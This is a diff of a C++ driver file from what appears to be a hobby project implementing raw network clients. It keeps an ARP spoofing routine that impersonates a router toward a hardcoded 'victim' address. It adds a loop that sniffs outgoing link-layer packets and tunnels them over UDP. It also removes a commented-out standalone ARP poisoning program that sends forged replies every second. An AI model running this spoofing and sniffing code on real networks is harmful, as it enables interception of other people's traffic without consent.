@@ -1,6 +1,10 @@
 #include <iostream>
 #include <vector>
 #include <linux/if_ether.h>
+#include <pcap/pcap.h>
+#include <thread>
+#include <net/if.h>
+#include <sys/ioctl.h>
 
 #include "linux/tcp/tcp_conn_client.h"
 #include "linux/udp/udp_conn_client.h"
@@ -12,6 +16,7 @@
 
 #include "abstract/basic_gateway.h"
 #include "abstract/basic_encapsulating_client.h"
+#include "linux/data_link_layer/data_link_layer_gateway.h"
 
 #define IP "127.0.0.1"
 #define PORT 4444
@@ -19,7 +24,6 @@
 int udp_main() {
 
     ip4_conn_client ip_client(IP);
-    ip_client.register_handler(IPPROTO_UDP);
 
     udp_conn_client client(PORT);
     client.ip_client = &ip_client;
@@ -29,7 +33,6 @@ int udp_main() {
     int len = strlen(msg);
 //    cout << "sent " << client.send_data(msg, len) << " bytes" << endl;
     client.send_data(msg, len);
-    cout << "sent bytes" << endl;
 
     char buff[6];
     memset(buff, '\x00', 6);
@@ -44,7 +47,6 @@ int udp_main() {
     int len2 = strlen(msg2);
 //    cout << "sent " << client.send_data(msg2, len2) << " bytes" << endl;
     client.send_data(msg2, len2);
-    cout << "sent bytes" << endl;
 
     char buff2[6];
     memset(buff2, '\x00', 6);
@@ -110,7 +112,6 @@ int dns_main() {
     };
 
     ip4_conn_client ip_client("8.8.8.8");
-    ip_client.register_handler(IPPROTO_UDP);
 
     udp_conn_client udp_client(DNS_PORT);
     udp_client.ip_client = &ip_client;
@@ -129,7 +130,6 @@ int icmp_main() {
 //    char* str = "google.com";
 
     ip4_conn_client ip_client(str);
-    ip_client.register_handler(IPPROTO_ICMP);
 
     icmp_conn_client icmp_client;
     icmp_client.ip_client = &ip_client;
@@ -147,104 +147,111 @@ int arp_main() {
 
     string victim = "10.100.102.15";
     vector<pair<mac_addr, string>> victim_list = {
-            {arp_client.search_for_device(victim),victim}
+//            {arp_client.search_for_device(victim),victim}
+            {{0x20, 0x7b, 0xd2, 0xaf, 0xdb, 0xc9}, victim}
     };
     arp_client.spoof_as_device("10.100.102.1", // router
                                victim_list);
 
 }
 
+void tunnel_main() {
+    ip4_conn_client ip_client(IP);
+
+    udp_conn_client udp_client(PORT);
+    udp_client.ip_client = &ip_client;
+
+    data_link_traffic traffic(false); // traffic coming out
+    while (true) {
+#define BUFF_LEN 512
+        char buff[BUFF_LEN];
+        memset(buff, 0, BUFF_LEN);
+
+        int len = traffic.sniff_next_msg(buff, BUFF_LEN); // next message
+
+        // tunnel through udp
+        cout << "packet read. tunneling in udp" << endl;
+        udp_client.send_data(buff, len);
+    }
+}
+
+int data_link_layer_fd;
+struct sockaddr_ll dest_addr; // used for interface
+void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data)
+{
+    cout << "Packet captured with len " << header->len << endl;
+
+
+//    cout << "sent raw bytes: " << sendto(data_link_layer_fd,
+//                                         pkt_data, header->len,
+//                                         0,
+//                                         reinterpret_cast<const sockaddr *>(&dest_addr), sizeof(dest_addr)) << endl;
+
+//#define BUFF_LEN 20
+//    char buff[BUFF_LEN];
+//    memset(buff, 'a', BUFF_LEN);
+//cout << "sent raw bytes: " << sendto(data_link_layer_fd,
+//                                         buff, BUFF_LEN,
+//                                         0,
+//                                         reinterpret_cast<const sockaddr *>(&dest_addr), sizeof(dest_addr)) << endl;
+
+}
+
+char *dev = "enp0s3";
 int main() {
+
+//    // open fd
+//    data_link_layer_fd = socket(
+//            AF_PACKET,
+//            SOCK_RAW,
+//            htons(ETH_P_ALL)
+//    );
+//    if (data_link_layer_fd == -1) {
+//        cerr << "data_link_layer_fd err" << endl;
+//        printf("errno: %d\n", errno);
+//        throw;
+//    }
+//
+//    // get if_req
+//    struct ifreq if_idx;
+//    memset(&if_idx, 0, sizeof(struct ifreq));
+//    strncpy(if_idx.ifr_name, dev, IFNAMSIZ - 1);
+//
+//    int temp_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP)); // todo change to ALL?
+//    if (ioctl(temp_fd, SIOCGIFINDEX, &if_idx) < 0)
+//        perror("SIOCGIFINDEX");
+//    close(temp_fd);
+//
+//    // set ll socket data
+//    dest_addr.sll_ifindex = if_idx.ifr_ifindex;
+//
+//
+//    // open the interface to be able to capture traffic
+//    char errbuf[PCAP_ERRBUF_SIZE]; // Error string
+//    pcap_t * traffic = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+//    if (traffic == nullptr) {
+//        cerr << "can't open interface: " << dev << ", err: " << errbuf << endl;
+//        throw;
+//    }
+//
+//    pcap_loop(traffic, 0, packet_handler, NULL);
+
+//    pcap_close(traffic);
+
+
+
+
+
+
+
 //    udp_main();
 //    tcp_main();
 //    dns_main();
 //    icmp_main();
-    arp_main();
+//    arp_main();
+    tunnel_main();
+
+    return (0);
 }
 
 
-//#include <stdio.h>
-//#include <stdlib.h>
-//#include <string.h>
-//#include <unistd.h>
-//#include <arpa/inet.h>
-//#include <net/if.h>
-//#include <sys/socket.h>
-//#include <netpacket/packet.h>
-//#include <net/ethernet.h>
-//#include <netinet/if_ether.h>
-//#include <signal.h>
-//
-//#define IP4LEN 4
-//
-//int
-//main(int argc, char **argv) {
-//
-//
-////    if (argc < 4) {
-////        puts("usage:\t./arp_header-poison <INTERFACE> <gateway ip> <mac addr>");
-////        puts("ex:\t./arp_header-poison eth0 10.1.1.1 aa:bb:cc:dd:ee:ff");
-////        exit(1);
-////    }
-//
-//    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
-//    if (sock < 0)
-//        perror("socket"), exit(1);
-//
-//    char *INTERFACE = "enp0s3";
-//    char *ip = "10.0.0.1";
-//    char *mac = "aa:bb:cc:dd:ee:ff";
-//
-//#define PKTLEN sizeof(struct ether_header) + sizeof(struct ether_arp)
-//    char packet[PKTLEN];
-//    memset(packet, 0, PKTLEN);
-//
-//    struct ether_header *eth_header = (struct ether_header *) packet; // ethernet header
-//    struct ether_arp *arp_header = (struct ether_arp *) (packet + sizeof(struct ether_header)); // arp_header header
-//
-//
-//    // setup arp header
-//    sscanf(mac, "%x:%x:%x:%x:%x:%x", (unsigned int *) &arp_header->arp_sha[0],
-//           (unsigned int *) &arp_header->arp_sha[1],
-//           (unsigned int *) &arp_header->arp_sha[2],
-//           (unsigned int *) &arp_header->arp_sha[3],
-//           (unsigned int *) &arp_header->arp_sha[4],
-//           (unsigned int *) &arp_header->arp_sha[5]);
-//
-//    sscanf(ip, "%d.%d.%d.%d", (int *) &arp_header->arp_spa[0],
-//           (int *) &arp_header->arp_spa[1],
-//           (int *) &arp_header->arp_spa[2],
-//           (int *) &arp_header->arp_spa[3]);
-//
-//
-//    // setup ethernet header
-//    memset(eth_header->ether_dhost, 0xff, ETH_ALEN); // send to broadcast
-//    memcpy(eth_header->ether_shost, arp_header->arp_sha, ETH_ALEN);
-//    eth_header->ether_type = htons(ETH_P_ARP); // ethertype: arp
-//
-//
-//    // setup arp header
-//    arp_header->ea_hdr.ar_hrd = htons(ARPHRD_ETHER); // first arp addr type: mac
-//    arp_header->ea_hdr.ar_pro = htons(ETH_P_IP); // first arp addr type: ip
-//    arp_header->ea_hdr.ar_hln = ETH_ALEN; // len of mac addr
-//    arp_header->ea_hdr.ar_pln = IP4LEN; // len of ip addr
-//    arp_header->ea_hdr.ar_op = htons(ARPOP_REPLY); // type of arp (forged reply)
-//    memset(arp_header->arp_tha, 0xff, ETH_ALEN);
-//    memset(arp_header->arp_tpa, 0x00, IP4LEN);
-//
-//
-//    struct sockaddr_ll interface_addr;
-//    memset(&interface_addr, 0, sizeof(interface_addr));
-//    interface_addr.sll_ifindex = if_nametoindex(INTERFACE);
-//    interface_addr.sll_family = AF_PACKET;
-//    memcpy(interface_addr.sll_addr, arp_header->arp_sha, ETH_ALEN);
-//    interface_addr.sll_halen = htons(ETH_ALEN);
-//
-//    while (1) {
-//        printf("%s: %s is at %s\n", INTERFACE, ip, mac);
-//        cout << "sent" << endl;
-//        sendto(sock, packet, PKTLEN, 0, (struct sockaddr *) &interface_addr, sizeof(interface_addr));
-//        sleep(1);
-//    }
-//    return 0;
-//}
